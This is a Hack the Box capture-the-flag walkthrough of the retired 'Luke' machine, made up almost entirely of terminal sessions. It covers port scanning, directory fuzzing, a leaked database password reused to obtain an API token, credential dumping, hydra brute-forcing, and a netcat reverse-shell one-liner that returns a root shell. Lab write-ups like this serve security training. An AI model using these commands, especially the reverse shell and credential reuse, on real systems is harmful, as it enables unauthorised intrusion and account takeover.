---
layout: post
title: Hack the Box - Luke
date: 2020-09-18 12:16:22 +0100
description: Luke is a medium difficulty Linux box featuring server enumeration and credential reuse. A configuration file leads to credential disclosure, which can be used to authenticate to a NodeJS server. The server in turn stores user credentials, and one of these provides access to a password protected folder containing configuration files. From this, the Ajenti password can be obtained and used to sign in, and execute commands in the context of root.
img: luke.png
fig-caption: Luke
categories: HackTheBox
tags: [Medium, FreeBSD, Retired, CTF]
---
## Overview
Luke is a medium difficulty Linux box featuring server enumeration and credential reuse. A configuration file leads to credential disclosure, which can be used to authenticate to a NodeJS server. The server in turn stores user credentials, and one of these provides access to a password protected folder containing configuration files. From this, the Ajenti password can be obtained and used to sign in, and execute commands in the context of root.

## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/luke]
└─$ sudo nmap -p- -T4 10.129.2.37                                    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-24 12:17 GMT
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 8.00% done; ETC: 12:24 (0:05:56 remaining)
Stats: 0:03:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.33% done; ETC: 12:24 (0:02:33 remaining)
Stats: 0:05:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 85.66% done; ETC: 12:24 (0:00:55 remaining)
Nmap scan report for 10.129.2.37
Host is up (0.015s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 388.29 seconds
```
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/luke]
└─$ head for_Chihiro.txt   
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 

Derry
```
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/luke]
└─$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.2.37/FUZZ.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.2.37/FUZZ.php
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

config                  [Status: 200, Size: 202, Words: 22, Lines: 7]
login                   [Status: 200, Size: 1593, Words: 230, Lines: 40]
:: Progress: [220547/220547] :: Job [1/1] :: 2486 req/sec :: Duration: [0:01:39] :: Errors: 0 ::
```
```
$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
```
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/luke]
└─$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.2.37:3000/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.2.37:3000/FUZZ
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 56, Words: 5, Lines: 1]
login                   [Status: 200, Size: 13, Words: 2, Lines: 1]
users                   [Status: 200, Size: 56, Words: 5, Lines: 1]
```
## Foothold
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/luke]
└─$ curl --data "username=admin&password=Zk6heYCyv6ZE9Xcg" http://10.129.2.37:3000/login
{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjE2NTkwNDM3LCJleHAiOjE2MTY2NzY4Mzd9.petoVxguDdVe8J3CCsY4GsNNceeCDeSrOx3tlh1FY3o"}
```
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/luke]
└─$ curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjE2NTkwNDM3LCJleHAiOjE2MTY2NzY4Mzd9.petoVxguDdVe8J3CCsY4GsNNceeCDeSrOx3tlh1FY3o" http://10.129.2.37:3000/users
[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
```
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/luke]
└─$ curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjE2NTkwNDM3LCJleHAiOjE2MTY2NzY4Mzd9.petoVxguDdVe8J3CCsY4GsNNceeCDeSrOx3tlh1FY3o" http://10.129.2.37:3000/users/derry
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
```
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/luke]
└─$ hydra -L users.txt -P passwords.txt -s 80 -f 10.129.2.37 http-get /management           
...
[80][http-get] host: 10.129.2.37   login: Derry   password: rZ86wwLvx7jUxtch
```
## Privilege Escalation
```
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 5555 >/tmp/f
```
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/luke]
└─$ nc -nlvp 5555                 
listening on [any] 5555 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.2.37] 52680
# whoami
root
```